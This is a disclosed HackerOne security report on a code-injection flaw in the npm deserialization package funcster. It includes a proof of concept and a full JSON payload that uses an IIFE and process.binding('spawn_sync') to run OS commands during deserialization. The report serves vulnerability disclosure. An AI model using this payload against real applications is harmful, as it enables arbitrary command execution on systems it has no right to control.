# Insecure implementation of deserialization in funcster

## Report Details
- **Report ID**: 350401
- **URL**: https://hackerone.com/reports/350401
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-05-11T10:44:16.888Z
- **Disclosed**: 2018-06-15T21:48:25.666Z

## Reporter
- **Username**: greendog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report code injection in serialization package funcster.
It allows execute arbitrary code during deserialization of JSON.

# Module

**module name:** funcster
**version:** 0.0.3
**npm page:** `https://www.npmjs.com/package/funcster`

## Module Description

This library contains utilities for serializing and deserializing functions. It provides recursive traversal to discover both serialized and unserialized functions nested within objects and arrays. This is particularly useful for embedding functions into JSON objects.

## Module Stats

4 downloads in the last week

# Vulnerability

## Vulnerability Description

In an application uses "funcster" package to deserialize JSON into object and if an attacker controls this JSON, then an attacker can get arbitrary code execution in the application.
The package reconstructs an object with functions from JSON. But it's supposed that functions of the object are not executed until they are invoked directly in the code later. Using IIFE (immediately-invoked function expression), we as attackers can force funcster to execute our function from JSON during deserialization process.

## Steps To Reproduce:

The vulnerability exists because during deserialization process funcster creates a new module with exported functions from JSON.  Here is this part of code:
```
return "module.exports=(function(module,exports){return{" + entries + "};})();";
```

Using IIFE (immediately-invoked function expression), we as attackers can force funcster to execute our function from JSON during deserialization. The idea is similar to one described in this article -  https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

Here is a PoC:
```
var funcster = require('funcster');
var serJSON = { __js_function: 'function testa(){var pr = this.constructor.constructor("return process")(); pr.stdout.write("param-pam-pam") }()' }
var newFunc = funcster.deepDeserialize(serJSON);
```

funcster cuts standard built-in objects, but we can bring them back using the global object(this) and the "process" object.
Here is a JSON payload to get OS command execution(whoami):
```
 { __js_function: "function testa(){var process = this.constructor.constructor('return process')(); spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}/*process.stdout.write(JSON.stringify(a))*/;var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};var x= spawnSync('whoami'); process.stdout.write(x.output.toString());}()"}
```

## Patch

I see no ways to patch it because it is a consequence of design/approach which funster uses to serialize/deserialize object.

## Supporting Material/References:

- Ubuntu 16.04
- node v6.11.3
- npm 5.5.1 


# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker can craft a special JSON file with malicious code which will be executed during deserialization by funcster. So the attacker can achieve OS command execution.

## Attachments
No attachments
